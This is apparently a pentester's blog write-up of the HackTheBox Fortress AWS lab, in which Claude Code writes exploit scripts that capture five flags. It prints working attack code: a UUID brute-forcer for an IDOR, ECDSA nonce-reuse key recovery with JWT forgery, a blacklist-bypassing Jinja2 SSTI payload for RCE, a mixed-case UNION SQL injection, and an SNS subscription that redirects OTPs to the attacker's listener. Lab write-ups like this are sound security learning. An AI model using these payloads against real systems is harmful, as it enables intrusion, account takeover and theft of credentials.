# Claude Code as a Red Team Copilot: Hacking HTB Fortress AWS

*April 2026*

I got to Pro Hacker on HackTheBox the old way. Hours of nmap scans, manually crafting SQLi payloads, reading the same OWASP page for the third time at 2am. That grind taught me more about offensive security than any course.

These days I have a buddy doing the heavy lifting. Claude Code sits in my terminal, writes exploit scripts, chains API calls, and automates the tedious parts while I focus on strategy and judgment calls. We just ran it against the HTB Fortress AWS challenge and pulled 5 out of 10 flags in a single session.

This isn't a story about AI replacing pentesters. It's about what happens when you pair attack intuition with something that can write a threaded UUID brute-forcer in 30 seconds.

## The Target

Fortress AWS is a 10-flag challenge built around a fictional company (amzcorp.local) running a mix of:

- Flask web apps (jobs portal, support tickets, inventory system)
- Apache Airflow 2.2.3
- A custom AWS API endpoint backed by LocalStack (IAM, S3, DynamoDB, Lambda, SNS, SQS)
- An exposed `.git` repo
- A Windows Domain Controller

Eight subdomains, multiple Docker containers, a full AWS environment simulated through LocalStack, and a privilege escalation chain from basic web vulns all the way to IAM admin. The attack surface is wide.

## Flag 1: IDOR on UUID-Based API

The jobs portal at `jobs.amzcorp.local` had an API endpoint at `/api/v4/tokens/get` that accepted a base64-encoded JSON payload with a `uuid` field. The admin user's UUID wasn't sequential, but it wasn't random either. It was an integer.

Claude Code wrote a threaded brute-forcer using `concurrent.futures` that tested UUIDs 1 through 1000 in parallel. Hit 955 in under a minute.

```python
def try_uuid(uuid):
    payload = json.dumps({"get_token": "True", "uuid": str(uuid), "username": "admin"})
    data = {"data": base64.b64encode(payload.encode()).decode()}
    r = requests.post(f"{BASE}/api/v4/tokens/get", json=data,
                     headers={"Content-Type": "application/json"},
                     cookies=cookies, timeout=10)
    if "Invalid" not in r.text and r.status_code == 200:
        return (uuid, r.text)
```

`AWS{S1mPl3_iD0R_4_4dm1N}`

## Flag 2: SSRF to Internal Logs

The admin healthcheck endpoint at `/admin/healthcheck` accepted a URL parameter and fetched it server-side. Classic SSRF. Pointed it at `http://logs.amzcorp.local` which was only reachable from inside the Docker network.

The response came back base64-encoded. Decoded it and found DNS exfiltration data, system files from another container, and the flag buried in the logs.

`AWS{F1nD1nG_4_N33dl3_1n_h4y5t4ck}`

## Flag 3: ECDSA Nonce Reuse to RCE

This one was the most technically interesting. The `company-support.amzcorp.local` app issued JWT tokens signed with ES256 (ECDSA P-256). Two logins, two JWTs, same `r` value in the signatures. Fixed nonce.

With two signatures sharing a nonce `k`, you can recover the private key:

```python
k = ((z1 - z2) * pow(s1v - s2v, -1, q)) % q
d = ((s1v * k - z1) * pow(r_val, -1, q)) % q
```

Claude Code derived the key, forged a JWT as the admin user `tony`, and used it to view support tickets. The ticket rendering used `render_template_string` on user-controlled input. SSTI.

The catch: the app blacklisted `__` (double underscores). The bypass was passing dunders through HTTP request headers:

```python
SSTI = "{{url_for|attr(request.headers.a)|attr(request.headers.b)(request.headers.c)|attr(request.headers.d)(request.headers.e)|attr(request.headers.f)()}}"

# Headers: a=__globals__, b=__getitem__, c=os, d=popen, e=<command>, f=read
```

Full RCE on the container. Flag at `/opt/flag.txt`.

`AWS{N0nc3_R3u5e_t0_s571_c0de_ex3cu71on}`

## Flag 4: Reversing the Backup Tool

The support container had an ELF binary at `/opt/firmware_updates/backup_tool`. Claude Code pulled it down, ran it through `strings`, and identified a non-standard TOTP implementation using 128-byte HMAC-SHA1 with zero-padded blocks.

Key: `59329788626084537462`, 30-second period. The binary authenticated with username `backdoor` and password `<!8,>;<;He`.

`AWS{r3v3r51ng_1mpl4nt5_1s_fun}`

## Flag 5: MySQL Injection with Blacklist Bypass

The jobs portal admin search at `/admin/users/search` had SQL injection. The app defined a blacklist: `0x`, `**`, `ifnull`, `" or "`, `union`. But the blacklist was case-sensitive.

```sql
' UnIoN SeLeCt 999,concat(key_name,':',key_value),'x','1','x' FROM keys_tbl LIMIT 1 OFFSET 0--
```

Mixed case `UnIoN SeLeCt` walked right past it. Extracted AWS access keys for user `roy`, the full database schema (7 tables), and inventory portal credentials.

`AWS{MySqL_T1m3_B453d_1nJ3c71on5_4_7h3_w1N}`

## The OTP Bypass That Almost Worked (Flag 6 in Progress)

The inventory portal at `inventory.amzcorp.local` required email + password + OTP. After login, the app published the OTP to an AWS SNS topic. Roy's AWS credentials had `SNS:Subscribe` permissions.

The play:

1. Start a socket-based HTTP listener on my machine
2. Use Roy's keys to subscribe my IP to the SNS `otp` topic
3. Login to the inventory portal (triggers OTP publish)
4. Capture the OTP from the SNS notification (arrived in < 0.5 seconds)
5. Submit it to `/otp` with the same session

```python
sns.subscribe(TopicArn='arn:aws:sns:us-east-1:000000000000:otp',
              Protocol='http',
              Endpoint='http://10.10.14.161:9999/otp')
```

It worked. Got into the inventory dashboard. But the admin settings page requires elevated access we haven't cracked yet. The SNS delivery was also intermittent, as LocalStack's Docker networking to our VPN IP would drop after ~10 minutes. Still, the technique is sound and the authentication bypass is confirmed.

## What Claude Code Actually Did

Claude Code wasn't just autocomplete. It was running the show on execution while I directed strategy. Specific things it handled autonomously:

- **Exploit scripting**: Wrote the ECDSA key recovery, JWT forgery, SSTI payload chain, and threaded brute-forcers from scratch
- **AWS API enumeration**: Set up boto3 sessions, tried every IAM/S3/DynamoDB/SNS/SQS operation against the custom cloud API, handled SigV4 signing
- **SQLi extraction**: Built the UNION-based extraction pipeline, enumerated all databases, tables, and columns across 5 MySQL schemas
- **Network reconnaissance**: Port scanned from inside compromised containers, mapped Docker networks, tested cross-container reachability
- **SNS subscription management**: Created subscriptions, published test messages, handled the intermittent delivery with retry logic

What it couldn't do: decide which attack path to pursue when multiple options existed, recognize when bruteforcing meant we were on the wrong track, or know when to step back and try something else. That's still the human's job.

## What's Left

Five flags remain. The attack chain from here involves:

- **AWS privilege escalation**: User `will` can create Lambda functions with the `serviceadm` IAM role, which can `AttachUserPolicy` to any user. Classic Lambda privesc path.
- **DynamoDB**: User `john` has scan access to `Users` and `Backup_Users` tables. Need john's access keys first.
- **Airflow 2.2.3**: Known SECRET_KEY but no users in the database. Session forging doesn't work without a valid user ID.
- **Active Directory**: The DC at `amzcorp.local` is sitting there with Kerberos and LDAP. Haven't found valid AD credentials yet.

The remaining flags are gated behind finding two specific AWS access keys (john and will). Those keys are likely behind the inventory admin panel or inside the DynamoDB tables themselves, creating a circular dependency that needs a creative break.

## Takeaway

Claude Code turned a multi-day fortress grind into a focused session. The things that used to eat hours (writing extraction scripts, handling JWT crypto, managing AWS API calls) now take seconds. The strategy, intuition, and knowing when to pivot are still 100% human.

It's pair programming for pentesting. I wouldn't send it solo against a target. But I wouldn't go back to grinding without it either.
